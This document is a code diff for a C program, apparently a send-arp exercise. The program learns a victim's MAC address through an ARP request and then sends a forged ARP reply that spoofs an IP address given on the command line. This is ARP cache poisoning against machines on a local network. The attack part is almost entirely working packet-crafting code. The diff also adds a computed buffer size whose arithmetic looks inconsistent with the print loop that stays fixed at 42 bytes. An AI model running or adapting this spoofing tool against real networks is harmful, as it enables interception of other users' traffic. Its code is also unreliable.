@@ -10,10 +10,6 @@
 #include <netdb.h>
 #include <stdio.h>
 #include <string.h>
-#include <net/ethernet.h>
-#include <netinet/in_systm.h>
-#include <libnet/libnet-macros.h>
-#include <libnet/libnet-headers.h>
 
 struct libnet_ethernet_hdr ehtH;
 struct libnet_arp_hdr arpH;
@@ -60,9 +56,9 @@ void makepacket(u_int8_t* packet, struct arpAddr a) {
 
 int main(int argc, char* argv[]) {
 
-/*	if (argc != 3) {
+	if (argc != 4) {
 		return -1;
-	}*/
+	}
 
 	char* dev = argv[1];
 
@@ -70,7 +66,6 @@ int main(int argc, char* argv[]) {
 
 	char* senderip = argv[2];
 	makearp(senderip, ARPOP_REQUEST);
-
 
 	printf("(si) Attacker Mac = ");
         for (int i = 0; i < 6; ++i) printf("%02x ", req.sha[i]);
@@ -88,7 +83,12 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	u_int8_t arppacket[42];
+	printf("%d\n", sizeof(struct libnet_ethernet_hdr));
+	printf("%d\n", sizeof(struct libnet_arp_hdr));
+	printf("%d\n", sizeof(struct arpAddr));
+
+	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + sizeof(struct arpAddr);
+	u_int8_t arppacket[size];
 
 	makepacket(arppacket, req);
 
@@ -99,7 +99,7 @@ int main(int argc, char* argv[]) {
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 
-		pcap_sendpacket(handle, arppacket, 42);
+		pcap_sendpacket(handle, arppacket, size);
 
 		struct libnet_ethernet_hdr* replyehtH = (struct libnet_ethernet_hdr *)packet;
 
@@ -113,16 +113,14 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-
 	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = end.tha[i];
 	inet_pton(AF_INET, argv[3], end.spa);
 	arpH.ar_op = ntohs(ARPOP_REPLY);
 	makepacket(arppacket, end);
 
-	pcap_sendpacket(handle, arppacket, 42);
+	pcap_sendpacket(handle, arppacket, size);
 
 	for(int i=0; i<42; i++) printf("%02x ", arppacket[i]);
-
 
 	printf("\n");
 	return 0;
